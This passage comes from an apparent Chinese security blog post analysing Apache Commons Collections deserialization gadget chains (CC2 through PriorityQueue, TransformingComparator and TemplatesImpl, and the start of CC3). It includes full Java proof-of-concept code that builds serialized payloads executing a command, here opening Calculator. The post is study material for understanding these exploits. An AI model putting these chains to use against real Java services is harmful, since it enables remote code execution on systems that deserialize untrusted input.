class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>预备知识：</p><p><a href="https://www.cnblogs.com/scy251147/p/11100961.html" target="_blank" rel="noopener">javassist</a></p><p><a href="https://0range228.github.io/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/">JVM类加载机制</a></p><h3 id="利用链寻找-2"><a href="#利用链寻找-2" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>第一件事依然是寻找readObject复写点，这次盯上的是jdk的<strong>PriorityQueue</strong>：</p><blockquote><p>PriorityQueue 优先级队列是基于优先级堆的一种特殊队列 , 它满足队列 “ 队尾进 , 队头出 “ 的特点 </p><p><strong>队列中每次插入或删除元素时 , 都会调用 Comparator 方法对队列进行调整</strong> </p><p><strong>缺省情况下 , 优先级队列会根据自然顺序对元素进行排序 , 形成一个最小堆( 父节点的键值总是小于或等于任何一个子节点的键值 ) . 当指定了Comparator后 , 优先级队列会根据Comparator的定义对元素进行排序.</strong></p></blockquote><p>梳理了一下PriorityQueue类的流程：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514104821773.png" alt="image-20210514104821773"></p><p>可以看到queue和comparator都是进行了可控性的传递。</p><p>那这里我们继续寻找哪些实现了Comparator接口的类拥有compare方法，目标锁定到<strong>TransformingComparator</strong>：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514120620377.png" alt="image-20210514120620377"></p><p>哦这熟悉的transformer.transform 可控！</p><p>但是他并不像ChainedTransformer一样是成环transform，仅仅调用了一次Comparator.compare。</p><h3 id="TransformingComparator版本"><a href="#TransformingComparator版本" class="headerlink" title="TransformingComparator版本"></a>TransformingComparator版本</h3><h4 id="最终版本PoC-2"><a href="#最终版本PoC-2" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><p>这里完全可以借助这一点，写一版PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2_TransformingComparator_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] raw_payload = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[]&#123;"open  /Applications/Calculator.app"&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(raw_payload);</span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc2_TransformingComparator.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc2_TransformingComparator.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>细节</p><ol><li>为什么put了两个值：</li></ol><p>因为在heapify方法实现如下：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514110829082.png" alt="image-20210514110829082"></p><p>这里只有size&gt;1才能进入循环。</p><ol start="2"><li>add做了什么事？</li></ol><p>两次add做了什么事，这里要force-step(红色的小箭头)进入</p><p>调用梳理如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add() -&gt; offer() -(第二次才会)-&gt; siftUp() -&gt; siftUpComparable()</span><br></pre></td></tr></table></figure><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112304003.png" alt="image-20210514112304003"></p><p>第二次：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112556522.png" alt="image-20210514112556522"></p><p>由于我们没有设置comparator，所以会进入else分支：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112722687.png" alt="image-20210514112722687"></p><p>siftUpComparable方法只是把元素放到队列里，并没有做什么事：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514113611190.png" alt="image-20210514113611190"></p><ol start="3"><li>为什么还反射来构造函数来修改值？</li></ol><p>因为为了可以满足赋值，需要让comparator属性为null，才能继续走：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112722687.png" alt="image-20210514112722687"></p><p>当我们再次反射，是为了可以在之后的readObject里面使用comparator属性来调用compare方法，我们需要给他赋值恶意chain。</p><h4 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h4><ol><li>payload：PriorityQueue（2，TransformingComparator(transformer = chain)）</li><li>对于PriorityQueue来说，他的comparator就是TransformingComparator(transformer = chain)这一串东西。</li><li>首先肯定是进入PriorityQueue的readObject方法，一路走。</li><li>之后重点在PriorityQueue的siftDown方法中，会校验comparator是否为null，显然不是，进入siftDownUsingComparator方法。</li><li>之后在siftDownUsingComparator进行了comparator.compare，下图显示</li><li>由于comparator是TransformingComparator类对象，所以进入TransformingComparator的compare方法</li><li>这时TransformingComparator对象的this.transformer属性就是chain，chain.transform成环调用，触发。</li></ol><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514122321048.png" alt="image-20210514122321048"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514122515406.png" alt="image-20210514122515406"></p><p>第一个transform就会触发。</p><h3 id="TemplatesImpl版本"><a href="#TemplatesImpl版本" class="headerlink" title="TemplatesImpl版本"></a>TemplatesImpl版本</h3><p>ysoserial用的是这个版本</p><blockquote><p>之前提到过，TransformingComparator的compare内部并不像ChainedTransformer的transform一样是成环transform。</p></blockquote><p>ysoserial把目光聚焦在了TemplatesImpl里面</p><p>TemplatesImpl位于rt.jar下的sun包里面，源码分析：</p><p>TemplatesImpl这个类有两个属性：</p><ul><li>_bytecodes：byte[] 字节码的字节数组</li><li>_class: Class[] 根据 _bytecode 生成的Class对象</li></ul><p>可以看到：</p><p>getTransletInstance</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514132343726.png" alt="image-20210514132343726"></p><p>defineTransletClasses</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514115801660.png" alt="image-20210514115801660"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514115709993.png" alt="image-20210514115709993"></p><p>我们都知道静态代码块可以在类加载的同时执行，所以我们只要生成一个类，这个类的静态代码块里执行恶意命令。</p><p>所以这里我们就要找，哪里可以调用getTransletInstance方法，</p><p>发现在本类的newTransformer里面调用了getTransletInstance：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514133144671.png" alt="image-20210514133144671"></p><p>那哪里调用了newTransformer方法呢？发现在getoutputProperties里调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514133248367.png" alt="image-20210514133248367"></p><p>这部分有点乱画个调用图：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514183849675.png" alt="image-20210514183849675"></p><p>所以到目前为止，我们的收获：</p><ol><li>PriorityQueue的readObject可以走到Comparator接口的compare方法</li><li>TransformingComparator是Comparator的实现类，TransformingComparator的transform方法会调用Tranformer接口的transform函数</li><li>另一方面，TransformerImpl的newTransformer的一系列操作可以将_bytecode数组里面的内容加载进虚拟机，获得一个AbstractTranslet类的对象</li><li>创建这个对象的时候，Class类对象里的静态代码块必将被执行</li></ol><p>所以现在的问题就是，如何将一个实现了Tranformer接口的类，他的transform方法和TransformerImpl的newTransformer结合到一起。</p><h4 id="纽带"><a href="#纽带" class="headerlink" title="纽带"></a>纽带</h4><p>我们发现TransformingComparator的构造函数可以将Transformer类放入自身<em>transformer</em>类属性：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514142610125.png" alt="image-20210514142610125"></p><p>隐隐约约感觉能连上！</p><p>ysoserial的思路是将恶意操作放在一个类的静态代码块中，将这个类的bytecode传递给某个可控参数，最终传递给invoke函数命令执行。</p><p>开始构造PoC：</p><p>构造流程:</p><ol><li>首先我们要有一个PriorityQueue对象pq在最外面，作为readObject的入口</li><li>javassist生成一个恶意类，它的静态代码块中有恶意命令，获得这个恶意类的字节数组</li><li>拿到之后如何传递到链中，我们的payload说到底是一个static代码块，最理想的情况就是它被newInstance了，那我们就要找哪些方法可以做到，等等，好像不需要再找了，因为前文提到的TemplatesImpl的_bytecode数组内容在TemplatesImpl的getTransletInstance方法中被defineClass了</li><li>那么，现在问题就来到哪些类可以调用getTransletInstance方法呢？发现正巧的是TemplatesImpl自己的newTransformer就可以调用</li><li>所以现在就来到哪里可以调用newTransformer方法，发现没有，但是我们降维武器反射，这里需要用InvokeTransformer[]来包装一下“newTransformer”</li><li>现在还需要一个TemplatesImpl对象tmpl来帮我们做纽带，并且将这个对象的bytecode属性设置为恶意类，还要保证属性name不为null</li><li>tmpl现在的bytecode属性内容就是恶意类，所以调用tmpl的newTransformer方法就可以了！</li></ol><h4 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h4><ol><li><p>为什么恶意类要继承AbstractTranslet？</p><p>因为TemplatesImpl的defineTransletClasses方法中有个判断，如果当前恶意类的父类不是AbstractTranslet的话，<code>_tranletIndecx</code>的值就是初始值-1。但是对于我们，class[0]就是我们的恶意类的Class对象，后续的newInstance离不开它，所以我们当然希望<code>_tranletIndex</code>的值就是0。</p></li></ol><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514163650043.png" alt="image-20210514163650043"></p><p>为什么<code>_tranletIndex</code>的值一定要是0呢？？？因为我们可以看到在TemplatesImpl的getTransletInstance中：<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514164219670.png" alt="image-20210514164219670"></p><p><code>_transletIndex</code>决定了<code>_class</code>数组的检索位置。</p><ol start="2"><li>为什么<code>_name</code>和<code>_class</code>属性要为null？</li></ol><p>因为在getTransletClasses中，只有满足这两个方法，才能进入defineTransletClasses：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514164740087.png" alt="image-20210514164740087"></p><ol start="3"><li>为什么要改<code>size</code>的值？</li></ol><p>因为在heapify()中：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514165822726.png" alt="image-20210514165822726"></p><p>PriorityQueue的size属性默认是0，在这就会断掉。</p><ol start="4"><li>为什么不能直接给PriorityQueue的queue属性去赋值？非要用反射？</li></ol><p>queue的值其实会在compare中当作参数，所以一定要有值。</p><p>不能直接赋值是因为：</p><p>抛开queue属性是private transient Object[] queue;</p><p>queue属性以及其长度都是初始化时候得到的</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514172000161.png" alt="image-20210514172000161"></p><p>好的现在如果是queue.add()的话：</p><p>只改一个地方：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514172637366.png" alt="image-20210514172637366"></p><p>(其实这里面只add一次tmpl也是可以的)</p><p>第一次是2，他会先进行一个自动装箱，变成new Integer(2)，因为PriorityQueue接受Obejct泛型。</p><p>第一次由于size是初始值0，所以只是老实的进入queue[0]，size变成1</p><p>第二次由于是i=size，目前size是1，会进入siftUp函数</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173317035.png" alt="image-20210514173317035"></p><p>然后进入siftUpUsingComparator：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173453769.png" alt="image-20210514173453769"></p><p>这里多说几句，可以看到k，x两个参数1和tmpl</p><p>parent是0，e=queue[1]也就是Integer(1)</p><p>接下来会进入comparator的compare方法；</p><p>来到第一个tranform：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173727496.png" alt="image-20210514173727496"></p><p>仔细看的话可以看出来obj1是上面siftUpUsingComparator函数的第二个函数x也就是Tmpl，obj2是上面的e，就是第一次传进去的值2</p><p><strong>这里就会提前触发调用链，利用失败。</strong></p><p>多说一句，就算绕过这里，在第三行this.decorated.compare语句又会走向哪里？</p><p>我们当前传进来的comparator采用的是第一个构造函数，只有一个InvokerTransformer[]</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514174908649.png" alt="image-20210514174908649"></p><p>这里面第二个参数是什么？</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514174938291.png" alt="image-20210514174938291"></p><p>再点进去发现是包装类的compareTo方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514175531065.png" alt="image-20210514175531065"></p><p>那就没事了。</p><p>现在可以回答这个问题了，因为<strong>会提前触发利用链</strong>，并且value1和value2的分别是两次transform的值，如果类型相同，是会走到这里的。</p><ol start="5"><li>第一个传进去的tmpl在哪里用到了？</li></ol><p>跟一遍，会发现在compare这里传进去了，给了transform：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514180443283.png" alt="image-20210514180443283"></p><ol start="6"><li><p>细心的你会发现，PriorityQueue的queue这个属性是transient的，为什么还能序列化成功？</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514180903833.png" alt="image-20210514180903833"></p></li></ol><p>queue本身作为transient属性，讲道理是不能写入到序列化的二进制文件中的。</p><p>是因为在PriorityQueue的writeObject方法中：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514181212114.png" alt="image-20210514181212114"></p><p>他先拿到流，然后把queue的内容循环的写入到流中，这样就被保存了下来。</p><h4 id="最终版本PoC-3"><a href="#最终版本PoC-3" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.开始做InvokerTransformer 命名为iInvokerTransformer，需要借助它内部的invoke方法调用newTransformer方法</span></span><br><span class="line">        <span class="comment">//然后用TransformingComparator包装他，因为TransformingComparator的构造函数可以把iInvokerTransformer传递给自身transformer属性</span></span><br><span class="line">        InvokerTransformer iInvokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator iTransformingComparator = <span class="keyword">new</span> TransformingComparator(iInvokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> Object[]&#123;tmpl, <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">        Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">        _comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _comparator.set(pq, iTransformingComparator);</span><br><span class="line">        <span class="comment">//解封属性queue，queueArray =&gt; _queue</span></span><br><span class="line">        Field _queue = PriorityQueue.class.getDeclaredField("queue");</span><br><span class="line">        _queue.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _queue.set(pq, queueArray);</span><br><span class="line">        <span class="comment">//size修改为2</span></span><br><span class="line">        Field _size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        _size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _size.set(pq, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc2_TemplatesImpl.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc2_TemplatesImpl.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc3"><a href="#cc3" class="headerlink" title="cc3"></a>cc3</h2><p>条件：</p><ul><li><strong>commons-collections: 3.1～3.2.1</strong></li><li>jdk7u21之前</li></ul><p>cc3更像是cc1和cc2的缝合变体，借助了cc1的lazyMap+动态代理和cc2的newInstance。</p><h3 id="利用链寻找-3"><a href="#利用链寻找-3" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>如果我们先从后半段开始看，和cc2一样，我们的目标是执行TemplatesImpl的newTransformer方法来newInstance</p><p>cc2中我们知道，newTransformer方法属于TemplatesImpl类，更是Templates接口的方法，</p><p>我们需要寻找哪里调用了Templates.newTransformer方法</p><p>搜索一圈发现TrAXFilter这个类比较合适：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515111125775.png" alt="image-20210515111125775"></p><p>跟进去看，发现构造函数依赖Templates接口的参数，会调用参数的newTransformer方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515112530417.png" alt="image-20210515112530417"></p><p>所以现在，<strong>我们需要构造这个参数templates</strong></p><p>或者<strong>new 